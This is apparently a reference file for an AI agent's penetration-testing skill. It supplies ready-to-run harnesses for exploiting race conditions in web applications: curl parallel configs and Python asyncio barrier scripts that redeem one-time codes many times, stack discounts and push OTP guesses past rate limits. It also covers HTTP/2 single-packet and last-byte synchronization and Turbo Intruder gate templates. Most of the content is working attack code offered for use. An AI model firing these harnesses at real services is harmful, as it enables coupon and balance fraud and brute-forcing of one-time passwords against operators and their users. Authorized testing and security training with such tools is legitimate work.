# Concurrency execution harnesses — Open WHEN: a race-prone endpoint is identified and you need to actually fire synchronized concurrent requests, choose between single- vs multi-endpoint timing, or break the single-packet byte limit

The SKILL.md body covers when a race exists and which class it is. This
file is the execution layer: copy-paste harnesses you can run with the
allowed tools (`curl`, `bash`, `php`, a short Python script), plus the
mechanics of the HTTP/2 single-packet attack and the Turbo-Intruder gate
templates kept for reference.

Always do this in order: (1) baseline a single request and record the
exact denied/accepted response, (2) fire the concurrent batch, (3) diff
the outcomes and prove N>1 durable effects.

---

## 1. Pick the harness by race shape

| Race shape | What to send | Goal |
|---|---|---|
| Single-endpoint limit-overrun | same request × N | N identical commits where 1 should win (redeem coupon N times, vote N times, overdraw balance) |
| Single-endpoint rate-limit / OTP | same request × N | sneak >limit guesses/actions through an edge counter |
| Multi-endpoint TOCTOU | request A once, then request B × N in the same window | B lands inside A's processing window (apply-discount during add-to-cart; read object mid-create) |
| Partial-construction | create request, then read/action × N fired the same instant | hit the object while it is half-initialized |

The timing primitive (single-packet vs last-byte sync) is independent of
the shape — pick it by protocol (`h2` → single-packet, else last-byte).

---

## 2. curl `--parallel` — fastest single-endpoint harness

`curl` reuses one HTTP/2 connection and multiplexes when the server
advertises `h2`. Group identical requests in one `curl` invocation so
they share the warmed connection.

```bash
# 30 identical POSTs over one multiplexed HTTP/2 connection.
# --parallel runs them concurrently; --parallel-immediate avoids staggering.
seq 30 | xargs -I{} -P0 printf -- '--next\n--url\nhttps://TARGET/api/redeem\n' > /tmp/cfg
# Simpler: build a config with one URL block per request.
: > /tmp/race.cfg
for i in $(seq 1 30); do
  cat >> /tmp/race.cfg <<'EOF'
url = "https://TARGET/api/redeem"
request = "POST"
header = "Cookie: session=SESSION"
header = "Content-Type: application/json"
data = "{\"code\":\"ONE-TIME-CODE\"}"
next
EOF
done
curl --http2 --parallel --parallel-immediate --parallel-max 30 \
     -sS -o /dev/null -w '%{http_code} %{time_total}\n' \
     --config /tmp/race.cfg | sort | uniq -c
```

Read the result: if more than one request returns the success code/body
when the resource is single-use, that is a hit. Re-check durable state
(balance, coupon-used flag, row count) out of band — do not trust the
response code alone, since dedup may suppress the response while the side
effect still fires.

Quick one-liner variant (less precise, good for a first probe):

```bash
for i in $(seq 1 20); do
  curl --http2 -sS -o /dev/null -w '%{http_code}\n' \
    -X POST https://TARGET/api/redeem \
    -H 'Cookie: session=SESSION' -H 'Content-Type: application/json' \
    --data '{"code":"ONE-TIME-CODE"}' &
done; wait
```

`&`+`wait` has more jitter than `--parallel` (separate processes, separate
connections). Use it only as a smoke test; promote to `--parallel` or the
Python harness once you see a candidate.

---

## 3. Python `asyncio` — multi-endpoint + tight synchronization

A barrier makes every coroutine release its request at the same instant.
This is the most reliable harness available with the allowed toolset for
multi-endpoint races (A-then-B) and for last-byte-style alignment.

```python
import asyncio, httpx

N = 30
TARGET = "https://TARGET"
COOKIES = {"session": "SESSION"}

async def fire(client, barrier, method, path, **kw):
    await barrier.wait()            # all coroutines block here, then go together
    r = await getattr(client, method)(TARGET + path, **kw)
    return r.status_code, len(r.content)

async def single_endpoint():
    # http2=True multiplexes over ONE connection -> near single-packet timing
    async with httpx.AsyncClient(http2=True, cookies=COOKIES, verify=False) as c:
        barrier = asyncio.Barrier(N)
        tasks = [fire(c, barrier, "post", "/api/redeem",
                      json={"code": "ONE-TIME-CODE"}) for _ in range(N)]
        for res in await asyncio.gather(*tasks):
            print(res)

async def multi_endpoint():
    # Request A once, then B*N, all released by the same barrier.
    async with httpx.AsyncClient(http2=True, cookies=COOKIES, verify=False) as c:
        barrier = asyncio.Barrier(N + 1)
        tasks  = [fire(c, barrier, "post", "/cart/add", json={"item": 1})]
        tasks += [fire(c, barrier, "post", "/cart/apply-discount",
                       json={"code": "SAVE50"}) for _ in range(N)]
        for res in await asyncio.gather(*tasks):
            print(res)

asyncio.run(single_endpoint())
```

If `httpx[http2]` is unavailable, the same pattern works with the stdlib:
`concurrent.futures.ThreadPoolExecutor` + a `threading.Barrier(N)`, each
thread doing a blocking `http.client.HTTPSConnection` request. Threads add
jitter vs. one multiplexed connection but still beat sequential firing.

---

## 4. HTTP/2 single-packet mechanics (what to reproduce)

The strongest sync removes network jitter by making every request finish
its final HTTP/2 frame in the same TCP packet:

1. Open one HTTP/2 connection; warm it with a throwaway request so TLS
   handshake and TCP slow-start are already paid.
2. Stream each request's HEADERS and most of its DATA, but withhold the
   last byte/frame of every request.
3. Flush all the final frames in a single `write()` so the OS coalesces
   them into one TCP segment — all requests complete server-side within
   microseconds of each other.

Practical ceilings and the fix:
- **~65,535-byte limit.** One TCP packet carries ~65,535 bytes of TLS
  record, so ~20–30 small requests fit. Larger bodies or more requests
  overflow into a second packet and lose synchronization.
- **First-sequence sync** breaks the limit: withhold the *final TCP
  segment* of every request (not just the final HTTP/2 frame), then send
  all the withheld segments together. This lets a batch span multiple
  packets yet still land simultaneously.

You will not hand-roll raw TLS here. Reproduce the effect with
`httpx(http2=True)` over one client (Section 3) or note that a dedicated
single-packet engine (`h2spacex`, Turbo Intruder's single-packet mode,
Burp "Send group in parallel") is required to push past ~30 requests or
large bodies. Confirm `h2` first: `curl -sI --http2 https://TARGET` and
check the response is `HTTP/2`, or read the ALPN from the TLS handshake.

---

## 5. Last-byte synchronization (HTTP/1.1 fallback, no `h2`)

When the server only speaks HTTP/1.1, you cannot multiplex. Instead hold
each request open and release its final byte together:

1. Open N keep-alive connections; warm each.
2. Send each request body except its final byte. Now every request is
   one byte away from completing.
3. Send the final byte on all N connections back-to-back (ideally from a
   tight loop with no awaits between writes).

The server parses all N requests almost simultaneously, recreating the
race window. In Python, open N `socket`/`ssl` connections, `send()` all
but the last byte on each, then loop a final `send(last_byte)` across all
sockets. Network proximity matters more here than for single-packet —
host the test client in the same region/cloud as the target so RTT
jitter does not swamp the window.

---

## 6. Turbo Intruder gate templates (reference only — not in-loop)

Kept for completeness; these run inside Burp's Turbo Intruder, which is
out of the worker's in-loop toolset. The `gate` mechanism queues requests
without sending, then `openGate` releases them together.

Single-endpoint, single-packet:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)        # HTTP/2 single-packet
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

Multi-endpoint (request1 then a burst of request2 in the same window):

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False)
    engine.queue(request1, gate='race1')
    for i in range(30):
        engine.queue(request2, gate='race1')
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

Last-byte sync uses the same `gate=` queue with the HTTP/1.1 engine; the
extension withholds and releases the final byte automatically.

---

## 7. Practice labs to mirror the technique (PortSwigger)

These name the exact race classes to look for in a target:
- Limit-overrun (single request type, fire N together)
- Bypassing rate limits via race conditions (sneak >limit guesses)
- Single-endpoint race conditions (same endpoint, two effects collide)
- Multi-endpoint race conditions (A-then-B timing window)
- Partial construction (read object mid-create)
- Exploiting time-sensitive vulnerabilities (predictable timestamp/token
  collisions under concurrency)

---

## 8. Proving the finding

A response code is not proof. For every candidate:
1. Record the single-request denied baseline.
2. Show N concurrent requests produced N (or >limit) durable effects:
   ledger rows, inventory count, coupon-used flag, role/flag change,
   duplicate accounts, extra OTP attempts consumed.
3. Reproduce across multiple runs — races are probabilistic; one lucky
   hit out of one run is weak. Report the hit rate (e.g. 4/10 runs).
4. Capture the exact request set and before/after state.
